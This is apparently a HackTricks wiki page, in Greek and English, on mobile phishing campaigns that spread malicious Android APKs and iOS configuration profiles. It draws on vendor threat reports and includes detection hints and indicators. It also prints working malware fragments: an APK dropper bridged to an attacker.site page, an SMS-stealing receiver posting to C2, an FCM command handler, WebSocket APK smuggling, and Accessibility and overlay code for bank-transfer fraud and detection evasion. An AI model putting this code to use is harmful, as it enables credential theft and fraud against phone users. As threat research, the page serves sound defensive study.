# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Αυτή η σελίδα καλύπτει τεχνικές που χρησιμοποιούν οι threat actors για τη διανομή **malicious Android APKs** και **iOS mobile-configuration profiles** μέσω phishing (SEO, social engineering, fake stores, dating apps, κ.λπ.).
> Το υλικό έχει προσαρμοστεί από την καμπάνια SarangTrap που αποκάλυψε η Zimperium zLabs (2025) και από άλλες δημόσιες έρευνες.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Καταχώριση δεκάδων look-alike domains (dating, cloud share, car service…).
– Χρήση τοπικών λέξεων-κλειδιών και emojis στο `<title>` στοιχείο για καλύτερο ranking στο Google.
– Φιλοξενία *both* Android (`.apk`) και iOS οδηγιών εγκατάστασης στην ίδια landing page.
2. **First Stage Download**
* Android: direct link σε ένα *unsigned* ή “third-party store” APK.
* iOS: `itms-services://` ή απλό HTTPS link προς ένα κακόβουλο **mobileconfig** profile (βλέπε παρακάτω).
3. **Post-install Social Engineering**
* Στην πρώτη εκτέλεση η εφαρμογή ζητάει έναν **invitation / verification code** (ψευδαίσθηση αποκλειστικής πρόσβασης).
* Ο κωδικός **POSTed over HTTP** στο Command-and-Control (C2).
* Το C2 απαντά `{"success":true}` ➜ το malware συνεχίζει.
* Sandbox / AV dynamic analysis που ποτέ δεν υποβάλει έγκυρο κωδικό δεν βλέπει **κακόβουλη συμπεριφορά** (evasion).
4. **Runtime Permission Abuse** (Android)
* Τα dangerous permissions ζητούνται μόνο **μετά από θετική απάντηση του C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Πρόσφατες παραλλαγές **remove `<uses-permission>` για SMS από `AndroidManifest.xml`** αλλά διατηρούν το Java/Kotlin code path που διαβάζει SMS μέσω reflection ⇒ μειώνει το static score ενώ παραμένει λειτουργικό σε συσκευές που χορηγούν την άδεια μέσω `AppOps` abuse ή παλαιών targets.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Το Android 13 εισήγαγε **Restricted settings** για sideloaded apps: τα toggles Accessibility και Notification Listener είναι greyed out μέχρι ο χρήστης να επιτρέψει ρητά τα restricted settings στο **App info**.
* Phishing pages και droppers πλέον παρέχουν step‑by‑step UI οδηγίες για να **allow restricted settings** στην sideloaded app και μετά να ενεργοποιήσουν Accessibility/Notification access.
* Μια νεότερη παράκαμψη είναι να εγκαταστήσουν το payload μέσω ενός **session‑based PackageInstaller flow** (η ίδια μέθοδος που χρησιμοποιούν τα app stores). Το Android θεωρεί την app ως store‑installed, άρα τα Restricted settings δεν μπλοκάρουν πλέον την Accessibility.
* Triage hint: σε έναν dropper, grep για `PackageInstaller.createSession/openSession` μαζί με κώδικα που αμέσως πλοηγεί το θύμα σε `ACTION_ACCESSIBILITY_SETTINGS` ή `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* Η app εμφανίζει harmless views (SMS viewer, gallery picker) που είναι υλοποιημένα τοπικά.
* Εντωμεταξύ εξάγει:
- IMEI / IMSI, phone number
- Full `ContactsContract` dump (JSON array)
- JPEG/PNG από `/sdcard/DCIM` συμπιεσμένα με [Luban](https://github.com/Curzibn/Luban) για μείωση μεγέθους
- Προαιρετικό περιεχόμενο SMS (`content://sms`)
Τα payloads είναι **batch-zipped** και αποστέλλονται μέσω `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* Ένα μόνο **mobile-configuration profile** μπορεί να ζητήσει `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` κ.λπ. για να εγγράψει τη συσκευή σε “MDM”-like supervision.
* Social-engineering οδηγίες:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* τρεις φορές (screenshots στη phishing page).
3. Trust το unsigned profile ➜ ο attacker αποκτά *Contacts* & *Photo* entitlement χωρίς App Store review.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads μπορούν να **pin a phishing URL to the Home Screen** με branded icon/label.
* Τα Web Clips μπορούν να τρέξουν **full‑screen** (κρύβουν το browser UI) και να χαρακτηριστούν **non‑removable**, αναγκάζοντας το θύμα να διαγράψει το profile για να αφαιρέσει το εικονίδιο.
9. **Network Layer**
* Plain HTTP, συχνά στην θύρα 80 με HOST header όπως `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → εύκολο να εντοπιστεί).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Κατά την αξιολόγηση malware, αυτοματοποιήστε το invitation code στάδιο με Frida/Objection για να φτάσετε στο malicious branch.
* **Manifest vs. Runtime Diff** – Συγκρίνετε `aapt dump permissions` με runtime `PackageManager#getRequestedPermissions()`; η απουσία dangerous perms είναι red flag.
* **Network Canary** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` για να εντοπίσετε ασυνήθιστες bursts από POST μετά την καταχώριση του κωδικού.
* **mobileconfig Inspection** – Χρησιμοποιήστε `security cms -D -i profile.mobileconfig` σε macOS για να εμφανίσετε το `PayloadContent` και να εντοπίσετε υπερβολικά entitlements.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Δείκτες (Γενικά)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Οι χειριστές αλυσίδωσαν αξιόπιστες πλατφόρμες για παράδοση και ανθεκτικότητα.

### Delivery chain across trusted platforms
- YouTube video lure → η περιγραφή περιέχει ένα short link
- Shortlink → GitHub Pages phishing site που μιμείται την νόμιμη πύλη
- Το ίδιο GitHub repo φιλοξενεί ένα APK με ψεύτικο “Google Play” badge που συνδέει απευθείας στο αρχείο
- Δυναμικές σελίδες phishing φιλοξενούνται στο Replit· το κανάλι απομακρυσμένων εντολών χρησιμοποιεί Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Το πρώτο APK είναι ένας installer (dropper) που μεταφέρει το πραγματικό malware στο `assets/app.apk` και ζητά από τον χρήστη να απενεργοποιήσει το Wi‑Fi/mobile data για να μειώσει τον εντοπισμό από το cloud.
- Το embedded payload εγκαθίσταται υπό έναν αθώο τίτλο (π.χ. “Secure Update”). Μετά την εγκατάσταση, τόσο ο installer όσο και το payload υπάρχουν ως ξεχωριστές εφαρμογές.

Συμβουλή για στατική ανάλυση (grep για embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Δυναμικός εντοπισμός endpoints μέσω shortlink
- Malware ανακτά μια λίστα ενεργών endpoints σε plain-text, χωρισμένη με κόμματα, από ένα shortlink· απλοί μετασχηματισμοί συμβολοσειράς παράγουν την τελική διαδρομή της σελίδας phishing.

Παράδειγμα (εξυγιασμένο):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Ψευδοκώδικας:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Συλλογή διαπιστευτηρίων UPI μέσω WebView
- Το βήμα “Make payment of ₹1 / UPI‑Lite” φορτώνει μια κακόβουλη HTML φόρμα από το δυναμικό endpoint μέσα σε ένα WebView και καταγράφει ευαίσθητα πεδία (τηλέφωνο, τράπεζα, UPI PIN) τα οποία αποστέλλονται με `POST` στο `addup.php`.

Ελάχιστος φορτωτής:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Ζητούνται επιθετικές άδειες κατά την πρώτη εκτέλεση:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Οι επαφές διατρέχονται για μαζική αποστολή smishing SMS από τη συσκευή του θύματος.
- Τα εισερχόμενα SMS παρεμποδίζονται από έναν broadcast receiver και ανεβαίνουν μαζί με μεταδεδομένα (αποστολέας, περιεχόμενο, SIM slot, τυχαίο ID ανά συσκευή) στο `/addsm.php`.

Σχέδιο του receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) ως ανθεκτικό C2
- Το payload εγγράφεται στο FCM· τα push messages περιέχουν ένα πεδίο `_type` που χρησιμοποιείται ως διακόπτης για την εκτέλεση ενεργειών (π.χ., ενημέρωση phishing text templates, εναλλαγή συμπεριφορών).

Παράδειγμα FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Σχέδιο handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Δείκτες/IOCs
- Το APK περιέχει δευτερεύον payload στο `assets/app.apk`
- Το WebView φορτώνει σελίδα πληρωμής από το `gate.htm` και exfiltrates στο `/addup.php`
- SMS exfiltration προς το `/addsm.php`
- Ανάκτηση config μέσω shortlink (π.χ. `rebrand.ly/*`) που επιστρέφει CSV endpoints
- Εφαρμογές επισημασμένες ως γενικές “Update/Secure Update”
- FCM `data` μηνύματα με διακριτικό `_type` σε μη αξιόπιστες εφαρμογές

---

## Socket.IO/WebSocket-based APK Smuggling + Ψεύτικες Google Play Pages

Οι επιτιθέμενοι όλο και περισσότερο αντικαθιστούν στατικές συνδέσεις APK με ένα κανάλι Socket.IO/WebSocket ενσωματωμένο σε δόλωμα που μοιάζει με Google Play. Αυτό αποκρύπτει το URL του payload, παρακάμπτει φίλτρα URL/extension και διατηρεί ρεαλιστικό install UX.

Τυπική ροή client που παρατηρήθηκε στο wild:

<details>
<summary>Socket.IO ψεύτικος Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Γιατί παρακάμπτει απλούς ελέγχους:
- Δεν εκτίθεται στατικό APK URL· το payload ανασυντίθεται στη μνήμη από WebSocket frames.
- Φίλτρα URL/MIME/επέκτασης που μπλοκάρουν απευθείας .apk απαντήσεις μπορεί να μην εντοπίζουν δυαδικά δεδομένα που διοχετεύονται μέσω WebSockets/Socket.IO.
- Crawlers και URL sandboxes που δεν εκτελούν WebSockets δεν θα ανακτήσουν το payload.

Δείτε επίσης WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Κατάχρηση Android Accessibility/Overlay & Device Admin, αυτοματοποίηση ATS και ορχηστρωσία NFC relay – Μελέτη περίπτωσης RatOn

Η εκστρατεία RatOn banker/RAT (ThreatFabric) είναι ένα συγκεκριμένο παράδειγμα του πώς οι σύγχρονες mobile phishing επιχειρήσεις συνδυάζουν WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, και ακόμη και NFC-relay orchestration. Αυτή η ενότητα απομονώνει τις επαναχρησιμοποιήσιμες τεχνικές.

### Stage-1: WebView → native install bridge (dropper)
Οι επιτιθέμενοι προβάλλουν ένα WebView που δείχνει σε μια σελίδα επιτιθέμενου και εγχέουν ένα JavaScript interface που εκθέτει έναν native installer. Ένα πάτημα σε ένα HTML button καλεί native κώδικα που εγκαθιστά ένα APK δεύτερου σταδίου, συσκευασμένο στα assets του dropper, και το εκκινεί απευθείας.

Ελάχιστο μοτίβο:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML στη σελίδα:
```html
<button onclick="bridge.installApk()">Install</button>
```
Μετά την εγκατάσταση, ο dropper ξεκινά το payload μέσω explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Ιδέα ανίχνευσης: μη αξιόπιστες εφαρμογές που καλούν `addJavascriptInterface()` και εκθέτουν installer-like methods σε WebView; APK που περιέχει ενσωματωμένο δευτερεύον payload στο `assets/` και επικαλείται το Package Installer Session API.

### Χωνί συναίνεσης: Accessibility + Device Admin + επακόλουθες προτροπές χρόνου εκτέλεσης
Stage-2 ανοίγει ένα WebView που φιλοξενεί μια σελίδα “Access”. Το κουμπί της καλεί μια exported method που πλοηγεί το θύμα στις ρυθμίσεις Accessibility και ζητά την ενεργοποίηση της rogue service. Μόλις παραχωρηθεί, το malware χρησιμοποιεί Accessibility για να auto-click μέσα από τις επακόλουθες runtime permission διαλόγους (contacts, overlay, manage system settings, κ.λπ.) και αιτείται Device Admin.

- Η υπηρεσία Accessibility προγραμματιστικά βοηθά στην αποδοχή των μετέπειτα προτροπών εντοπίζοντας κουμπιά όπως “Allow”/“OK” στο node-tree και στέλνοντας κλικ.
- Έλεγχος/αίτημα δικαιώματος overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Phishing/εκβιασμός με overlay μέσω WebView
Operators μπορούν να εκτελέσουν εντολές για να:
- εμφανίσουν ένα πλήρους οθόνης overlay από ένα URL, ή
- περάσουν inline HTML που φορτώνεται σε overlay WebView.

Πιθανές χρήσεις: αναγκασμός (εισαγωγή PIN), άνοιγμα wallet για να καταγραφούν PINs, μηνύματα εκβιασμού. Έχετε μια εντολή που εξασφαλίζει ότι η άδεια overlay έχει χορηγηθεί αν λείπει.

### Μοντέλο απομακρυσμένου ελέγχου – ψευδο-οθόνη κειμένου + screen-cast
- Χαμηλό εύρος ζώνης: περιοδικά εξάγετε το Accessibility node tree, σειριοποιείτε τα ορατά κείμενα/ρόλους/όρια και τα στέλνετε στο C2 ως ψευδο-οθόνη (εντολές όπως `txt_screen` μία φορά και `screen_live` συνεχώς).
- Υψηλή πιστότητα: ζητάτε MediaProjection και ξεκινάτε screen-casting/καταγραφή οθόνης κατ' απαίτηση (εντολές όπως `display` / `record`).

### ATS playbook (αυτοματοποίηση εφαρμογής τράπεζας)
Δεδομένου ενός JSON task, ανοίξτε την bank app, οδηγήστε το UI μέσω Accessibility με συνδυασμό ερωτημάτων κειμένου και taps σε συντεταγμένες, και εισάγετε το payment PIN του θύματος όταν ζητηθεί.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Παραδείγματα κειμένων που εμφανίζονται σε μία ροή στόχου (CZ → EN):
- "Nová platba" → "Νέα πληρωμή"
- "Zadat platbu" → "Καταχώρηση πληρωμής"
- "Nový příjemce" → "Νέος παραλήπτης"
- "Domácí číslo účtu" → "Αριθμός εγχώριου λογαριασμού"
- "Další" → "Επόμενο"
- "Odeslat" → "Αποστολή"
- "Ano, pokračovat" → "Ναι, συνέχισε"
- "Zaplatit" → "Πληρωμή"
- "Hotovo" → "Ολοκληρώθηκε"

Οι χειριστές μπορούν επίσης να ελέγξουν/αυξήσουν τα όρια μεταφοράς μέσω εντολών όπως `check_limit` και `limit` που πλοηγούν την διεπαφή ορίων με παρόμοιο τρόπο.

### Crypto wallet seed extraction
Στόχοι όπως MetaMask, Trust Wallet, Blockchain.com, Phantom. Ροή: ξεκλείδωμα (κλεμμένο PIN ή παρεχόμενος κωδικός), πλοήγηση στο Security/Recovery, αποκάλυψη/εμφάνιση seed phrase, keylog/exfiltrate it. Εφαρμόστε locale-aware selectors (EN/RU/CZ/SK) για να σταθεροποιήσετε την πλοήγηση ανάμεσα σε γλώσσες.

### Device Admin coercion
Οι Device Admin APIs χρησιμοποιούνται για να αυξήσουν τις ευκαιρίες συλλογής PIN και να ενοχλήσουν/αναστατώσουν το θύμα:

- Άμεσο κλείδωμα:
```java
dpm.lockNow();
```
- Λήξτε τα τρέχοντα credential για να επιβάλλετε αλλαγή (Accessibility καταγράφει το νέο PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Εξαναγκάστε μη-βιομετρικό ξεκλείδωμα απενεργοποιώντας τις βιομετρικές λειτουργίες του keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Σημείωση: Πολλοί έλεγχοι του DevicePolicyManager απαιτούν Device Owner/Profile Owner σε πρόσφατες εκδόσεις Android· κάποιες υλοποιήσεις OEM μπορεί να είναι πιο ελαστικές. Επαληθεύετε πάντα στο στοχευόμενο OS/OEM.

### Ορχήστρωση NFC relay (NFSkate)
Stage-3 μπορεί να εγκαταστήσει και να εκκινήσει ένα εξωτερικό NFC-relay module (π.χ., NFSkate) και ακόμη να του παραδώσει ένα HTML template για να καθοδηγήσει το θύμα κατά τη διάρκεια του relay. Αυτό επιτρέπει contactless card-present cash-out παράλληλα με online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Σετ εντολών operator (παράδειγμα)
- UI/κατάσταση: `txt_screen`, `screen_live`, `display`, `record`
- Κοινωνικά: `send_push`, `Facebook`, `WhatsApp`
- Επικαλύψεις: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Πορτοφόλια: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Συσκευή: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Επικοινωνίες/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Αντι-ανίχνευση ATS με χρήση Accessibility: ανθρώπινος ρυθμός κειμένου και διπλή εισαγωγή κειμένου (Herodotus)

Οι threat actors συνδυάζουν όλο και περισσότερο αυτοματοποίηση μέσω Accessibility με anti-detection ρυθμισμένο ενάντια σε βασικά behaviour biometrics. Μια πρόσφατη banker/RAT δείχνει δύο συμπληρωματικές λειτουργίες παράδοσης κειμένου και έναν toggle operator για την προσομοίωση ανθρώπινης πληκτρολόγησης με τυχαίο ρυθμό.

- Discovery mode: καταγράψτε τους ορατούς κόμβους με selectors και bounds για να στοχεύσετε με ακρίβεια εισόδους (ID, text, contentDescription, hint, bounds) πριν δράσετε.
- Διπλή εισαγωγή κειμένου:
- Λειτουργία 1 – `ACTION_SET_TEXT` απευθείας στον στοχευόμενο κόμβο (σταθερό, χωρίς πληκτρολόγιο);
- Λειτουργία 2 – ρύθμιση clipboard + `ACTION_PASTE` στο εστιασμένο node (λειτουργεί όταν το άμεσο setText μπλοκάρεται).
- Ανθρώπινος ρυθμός: διασπάστε το string που παρέχει ο operator και παραδώστε το χαρακτήρα-χαρακτήρα με τυχαίες καθυστερήσεις 300–3000 ms μεταξύ συμβάντων για να αποφύγετε τους heuristics «machine-speed typing». Υλοποιείται είτε με προοδευτική αύξηση της τιμής μέσω `ACTION_SET_TEXT`, είτε με επικόλληση ενός χαρακτήρα κάθε φορά.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Overlays για κάλυψη απάτης:
- Απεικόνισε ένα `TYPE_ACCESSIBILITY_OVERLAY` σε πλήρη οθόνη με αδιαφάνεια ελεγχόμενη από τον χειριστή· κράτησέ το αδιαφανές για το θύμα ενώ η απομακρυσμένη αυτοματοποίηση προχωράει από κάτω.
- Τυπικά εκτεθειμένες εντολές: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimal overlay with adjustable alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Συχνά εμφανιζόμενα operator control primitives: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (κοινή χρήση οθόνης).

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
